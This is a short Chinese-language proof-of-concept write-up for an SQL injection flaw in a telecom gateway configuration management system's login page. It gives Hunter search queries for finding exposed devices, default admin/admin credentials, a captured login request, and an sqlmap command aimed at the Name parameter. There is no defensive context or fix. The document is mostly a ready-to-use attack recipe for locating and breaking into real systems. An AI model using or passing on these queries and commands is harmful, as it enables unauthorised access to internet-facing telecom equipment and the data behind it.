# 电信网关配置管理系统 SQL注入漏洞

## 网络测绘

hunter: web.body="img/dl.gif" and web.title="系统登录"

hunter: web.body="img/login_bg3.png" and web.title="系统登录"

## POC / EXP

```
默认用户名：admin
默认密码：admin
```

抓登录包，保存txt

```
POST /manager/login.php HTTP/1.1
Host: x.x.x.x
Content-Length: 21
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://x.x.x.x
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://x.x.x.x/manager/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=1mr3udle5m1ptuj0c0hcpc5lt3
Connection: close

Name=admin&Pass=admin
```

sqlmap直接跑注入

```
sqlmap -r 1.txt -p Name --risk 3
```